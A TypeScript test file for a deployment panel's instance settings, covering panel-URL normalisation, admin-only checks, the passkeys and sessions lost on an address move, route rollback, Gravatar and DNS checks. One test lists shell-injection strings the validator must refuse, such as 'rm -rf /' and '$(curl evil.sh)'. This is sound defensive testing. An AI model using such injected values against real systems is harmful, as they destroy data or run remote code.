import { test, before, after, beforeEach } from "node:test";
import assert from "node:assert/strict";

import type { PGlite } from "@electric-sql/pglite";

import { makeTestDb, type TestDb } from "../db/test-harness";
import { __setTestDb, __resetTestDb } from "../db/client";
import { instanceSettings } from "../db/schema/control-plane";
import { passkey, session } from "../db/schema/auth";
import { runWithIdentity } from "../auth/request-context";
import {
  seedIdentity,
  TRUNCATE_IDENTITY,
  TEAM_A,
} from "./identity-test-helpers";
import { seedServerRow, TRUNCATE_INFRA } from "./infra-test-helpers";
import { __setDnsResolve4ForTest, __resetDnsResolve4ForTest } from "./domains";
import {
  getInstanceSettings,
  getPanelAddressImpact,
  getPanelHttps,
  instancePublicBaseUrl,
  moveWithRollback,
  noRouteReason,
  normalizePanelUrl,
  setPanelHttps,
  setPanelUrl,
  setGravatarEnabled,
  checkPanelDns,
} from "./instance-settings";
import { gravatarEnabled } from "../avatar";

/**
 * The panel address is not an ordinary text setting: it is interpolated into
 * copy-and-run strings, above all a server's install command, which the operator
 * pastes into a ROOT shell.
 */

let db: TestDb;
let pg: PGlite;

const ADMIN = "admin1";
const MEMBER = "member2";

before(async () => {
  ({ db, pg } = await makeTestDb());
  __setTestDb(db);
});

after(async () => {
  __resetTestDb();
  await pg.close();
});

beforeEach(async () => {
  await pg.exec(TRUNCATE_IDENTITY);
  await seedIdentity(db, {
    users: [
      { id: ADMIN, teamId: TEAM_A, role: "owner", isInstanceAdmin: true },
      { id: MEMBER, teamId: TEAM_A, role: "member", isInstanceAdmin: false },
    ],
  });
});

const asUser = <T>(userId: string, fn: () => Promise<T>): Promise<T> =>
  runWithIdentity({ userId, teamId: TEAM_A }, fn);

test("a bare domain is stored as an https URL", () => {
  assert.equal(
    normalizePanelUrl("deplo.example.com"),
    "https://deplo.example.com",
  );
  assert.equal(
    normalizePanelUrl("  deplo.example.com/  "),
    "https://deplo.example.com",
  );
  // An explicit http stays http: a bare IP with no proxy in front of it is a
  // real, if temporary, way to run this.
  assert.equal(
    normalizePanelUrl("http://10.0.0.4:3000"),
    "http://10.0.0.4:3000",
  );
});

test("anything that could escape a shell, or carry credentials, is refused", () => {
  for (const bad of [
    "deplo.example.com; rm -rf /",
    "deplo.example.com && curl evil.sh",
    "$(curl evil.sh)",
    "deplo.example.com`id`",
    "https://user:pw@deplo.example.com",
    "https://deplo.example.com/some/path",
    "ftp://deplo.example.com",
    "not a host",
  ]) {
    assert.throws(
      () => normalizePanelUrl(bad),
      new RegExp("."),
      `must refuse ${bad}`,
    );
  }
});

test("the settings name the instance owner, and null when nobody holds it", async () => {
  // Unowned is an ordinary state (a pre-0038 instance that never backfilled), so
  // the read answers null instead of inventing an owner for the header to print.
  assert.equal(
    (await asUser(ADMIN, () => getInstanceSettings())).ownerName,
    null,
  );

  await db.insert(instanceSettings).values({
    id: "default",
    ownerUserId: ADMIN,
    updatedAt: new Date().toISOString(),
  });
  // `seedIdentity` writes the id into `name`, so this is the display name.
  assert.equal(
    (await asUser(ADMIN, () => getInstanceSettings())).ownerName,
    ADMIN,
  );
});

test("only an instance admin can move the address", async () => {
  await assert.rejects(
    () => asUser(MEMBER, () => setPanelUrl("deplo.example.com")),
    /admin/i,
  );
  await assert.rejects(
    () => asUser(MEMBER, () => getInstanceSettings()),
    /admin/i,
  );
});

test("a stored address wins over the one the box was installed with", async (t) => {
  const previous = process.env.DEPLO_PUBLIC_URL;
  process.env.DEPLO_PUBLIC_URL = "https://installed.example.com";
  t.after(() => {
    if (previous === undefined) delete process.env.DEPLO_PUBLIC_URL;
    else process.env.DEPLO_PUBLIC_URL = previous;
  });

  // Nothing stored: the install-time value is what Deplo hands out.
  assert.equal(
    await asUser(ADMIN, () => instancePublicBaseUrl()),
    "https://installed.example.com",
  );

  const saved = await asUser(ADMIN, () => setPanelUrl("moved.example.com"));
  assert.equal(saved.panelUrl, "https://moved.example.com");
  assert.equal(saved.panelUrlSource, "stored");
  assert.equal(
    await asUser(ADMIN, () => instancePublicBaseUrl()),
    "https://moved.example.com",
  );

  // Clearing it hands the answer back to the environment rather than leaving an
  // instance with no address at all.
  const cleared = await asUser(ADMIN, () => setPanelUrl(null));
  assert.equal(cleared.storedPanelUrl, null);
  assert.equal(cleared.panelUrl, "https://installed.example.com");
  assert.equal(cleared.panelUrlSource, "environment");
});

/* ------------------------------------------------------------------ */
/* What moving the address would break                                 */
/* ------------------------------------------------------------------ */

/**
 * The dialog in front of the address field states facts, and these are the two
 * ways facts go wrong: counting things that are not affected (a wall of red in
 * front of a save that changes nothing), and missing the one thing that is gone
 * for good. A passkey cannot be moved to a new hostname and nothing warns about
 * it anywhere else.
 */
async function seedPasskeyAndSession(rpId: string) {
  await db.insert(passkey).values({
    id: `pk_${rpId}`,
    userId: ADMIN,
    publicKey: "public",
    credentialID: `cred_${rpId}`,
    counter: 0,
    deviceType: "singleDevice",
    backedUp: false,
    rpId,
  });
  await db.insert(session).values({
    id: "sess_1",
    userId: ADMIN,
    token: "token_1",
    expiresAt: new Date(Date.now() + 60 * 60 * 1000),
  });
}

const withPanelUrl = async <T>(
  url: string,
  fn: () => Promise<T>,
): Promise<T> => {
  const previous = process.env.DEPLO_PUBLIC_URL;
  process.env.DEPLO_PUBLIC_URL = url;
  const { setStoredPublicBaseUrl } = await import("../public-url");
  setStoredPublicBaseUrl(url);
  try {
    return await fn();
  } finally {
    setStoredPublicBaseUrl(null);
    if (previous === undefined) delete process.env.DEPLO_PUBLIC_URL;
    else process.env.DEPLO_PUBLIC_URL = previous;
  }
};

test("an address that does not move counts nothing", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("deplo.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("deplo.example.com"),
    );
    assert.equal(impact.hostChanges, false);
    assert.equal(impact.schemeChanges, false);
    assert.equal(
      impact.passkeys,
      0,
      "nothing is lost by saving the same address",
    );
    assert.equal(impact.sessions, 0);
  });
});

test("a new hostname counts the passkeys and sessions it takes with it", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("deplo.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("moved.example.com"),
    );
    assert.equal(impact.hostChanges, true);
    assert.equal(impact.losesHttps, false);
    assert.equal(impact.passkeys, 1);
    assert.equal(impact.passkeyPeople, 1);
    assert.equal(impact.sessions, 1);
    assert.equal(impact.sessionPeople, 1);
  });
});

test("a passkey minted for another address is not counted as a loss", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    // It is already dead: it belongs to an address this panel does not answer
    // on, so reporting it would inflate what this change costs.
    await seedPasskeyAndSession("previous.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("moved.example.com"),
    );
    assert.equal(impact.passkeys, 0);
    assert.equal(impact.sessions, 1);
  });
});

test("dropping https is counted as a loss even though the hostname stays", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("deplo.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("http://deplo.example.com"),
    );
    assert.equal(impact.hostChanges, false);
    assert.equal(impact.schemeChanges, true);
    assert.equal(impact.losesHttps, true);
    // WebAuthn has no relying party on plain http, so every one of them dies.
    assert.equal(impact.passkeys, 1);
  });
});

test("only an instance admin can ask what an address would break", async () => {
  await assert.rejects(
    () => asUser(MEMBER, () => getPanelAddressImpact("moved.example.com")),
    /admin/i,
  );
});

/* ------------------------------------------------------------------ */
/* The panel's own certificate                                         */
/* ------------------------------------------------------------------ */

test("how the panel is served is instance-admin only, both to read and to change", async () => {
  await assert.rejects(() => asUser(MEMBER, () => getPanelHttps()), /admin/i);
  await assert.rejects(
    () => asUser(MEMBER, () => setPanelHttps(false)),
    /admin/i,
  );
});

test("a Deplo whose own host is not added as a server says so, rather than failing", async () => {
  // The panel's box is a server like any other and an operator may simply not
  // have added it yet. That is an answer with a fix in it, not an error.
  const cert = await asUser(ADMIN, () => getPanelHttps());
  assert.equal(cert.domain, null);
  assert.equal(cert.enabled, false);
  assert.match(cert.unavailable ?? "", /not added here yet/i);
  await assert.rejects(
    () => asUser(ADMIN, () => setPanelHttps(true)),
    /not added here yet/i,
  );
});

test("storing an address still works when there is no route of ours to move", async () => {
  // The address field is also the tool an operator reaches for when their box has
  // moved. Refusing to store it because no host answers would take away the
  // recovery path along with the feature.
  const saved = await asUser(ADMIN, () => setPanelUrl("still.example.com"));
  assert.equal(saved.panelUrl, "https://still.example.com");
});

const ROUTE = {
  domain: "old.example.com",
  https: true,
  certResolver: "letsencrypt",
  target: "http://deplo:3000",
};

test("an address that does not answer puts the panel back where it was", async () => {
  const applied: string[] = [];
  await assert.rejects(
    () =>
      moveWithRollback({
        from: ROUTE,
        to: { ...ROUTE, domain: "new.example.com" },
        apply: async (route) => {
          applied.push(route.domain);
        },
        probe: async () => ({
          url: "https://new.example.com",
          ok: false,
          error:
            "https://new.example.com did not answer (getaddrinfo ENOTFOUND)",
        }),
      }),
    /did not answer[\s\S]*still on old\.example\.com/i,
  );
  // The rollback is the point: without the second apply the operator is locked
  // out of both addresses and the only way back is a shell on the box.
  assert.deepEqual(applied, ["new.example.com", "old.example.com"]);
});

test("an address that answers is kept, and nothing is put back", async () => {
  const applied: string[] = [];
  await moveWithRollback({
    from: ROUTE,
    to: { ...ROUTE, domain: "new.example.com" },
    apply: async (route) => {
      applied.push(route.domain);
    },
    probe: async () => ({
      url: "https://new.example.com",
      ok: true,
      error: null,
    }),
  });
  assert.deepEqual(applied, ["new.example.com"]);
});

test("no route of ours: only a panel with no domain at all is a refusal", () => {
  // A Deplo served straight on a port has nothing to route and nothing to
  // secure: it needs a domain first, and saying anything else sends the operator
  // to the wrong place.
  assert.match(
    noRouteReason("http://203.0.113.10:3000") ?? "",
    /domain address/i,
  );
  assert.match(noRouteReason("http://203.0.113.10") ?? "", /domain address/i);
  assert.match(noRouteReason("http://localhost:3000") ?? "", /domain address/i);

  // A routable domain is NOT a refusal: the panel is published by its own
  // container's labels, and Deplo can take that over rather than sending anyone
  // back to the installer.
  assert.equal(noRouteReason("https://deplo.example.com"), null);
  // A nip.io host is routable too - it is the address a fresh install hands out.
  assert.equal(noRouteReason("https://deplo.203-0-113-10.nip.io"), null);
});

/* ------------------------------------------------------------------ */
/* Gravatar                                                            */
/* ------------------------------------------------------------------ */

test("Gravatar defaults ON, and only an instance admin can turn it off", async () => {
  // No settings row at all is a fresh instance: it must read the column's own
  // default, not a `false` that would silently turn the feature off before
  // anybody chose to.
  assert.equal(await asUser(ADMIN, () => gravatarEnabled()), true);

  await assert.rejects(
    asUser(MEMBER, () => setGravatarEnabled(false)),
    /admin/i,
    "a plain member must not decide this for the instance",
  );
  assert.equal(await asUser(ADMIN, () => gravatarEnabled()), true);
});

test("setGravatarEnabled round-trips, and the read is ungated", async () => {
  await asUser(ADMIN, () => setGravatarEnabled(false));
  // Read as the MEMBER: the flag is consulted while building every DTO that
  // names a person, so a gate here would take the whole dashboard down for them.
  assert.equal(await asUser(MEMBER, () => gravatarEnabled()), false);
  assert.equal(
    (await asUser(ADMIN, () => getInstanceSettings())).gravatarEnabled,
    false,
  );

  await asUser(ADMIN, () => setGravatarEnabled(true));
  assert.equal(await asUser(MEMBER, () => gravatarEnabled()), true);
});

/* ---- Where the panel's own address points ------------------------- */

const HOST_IP = "203.0.113.10";

test("the panel's DNS check classifies the address the instance answers on", async () => {
  const prevIp = process.env.DEPLO_SERVER_IP;
  process.env.DEPLO_SERVER_IP = HOST_IP;
  await pg.exec(TRUNCATE_INFRA);
  await seedServerRow(db, { id: "srv_self", ip: HOST_IP, host: HOST_IP });
  await asUser(ADMIN, () => setPanelUrl("https://panel.example.com"));

  const at = async (ips: string[]) => {
    __setDnsResolve4ForTest(async () => ips);
    return asUser(ADMIN, checkPanelDns);
  };

  try {
    // Points straight here.
    assert.equal((await at([HOST_IP])).status, "valid");
    // Cloudflare's anycast range: routed, but the origin is not readable.
    assert.equal((await at(["104.16.0.1"])).status, "cloudflare");
    // Somewhere else entirely - the one case that still needs the A record.
    const off = await at(["198.51.100.7"]);
    assert.equal(off.status, "misconfigured");
    assert.deepEqual(off.resolved, ["198.51.100.7"]);
    // Nothing answered yet.
    assert.equal((await at([])).status, "pending");
    assert.equal((await at([])).host, "panel.example.com");

    // A bare address needs no record, so there is nothing to check.
    await asUser(ADMIN, () => setPanelUrl(`http://${HOST_IP}:3000`));
    assert.equal((await at([HOST_IP])).status, "unknown");
  } finally {
    __resetDnsResolve4ForTest();
    if (prevIp === undefined) delete process.env.DEPLO_SERVER_IP;
    else process.env.DEPLO_SERVER_IP = prevIp;
  }
});

test("only an instance admin may ask", async () => {
  await assert.rejects(() => asUser(MEMBER, checkPanelDns));
});
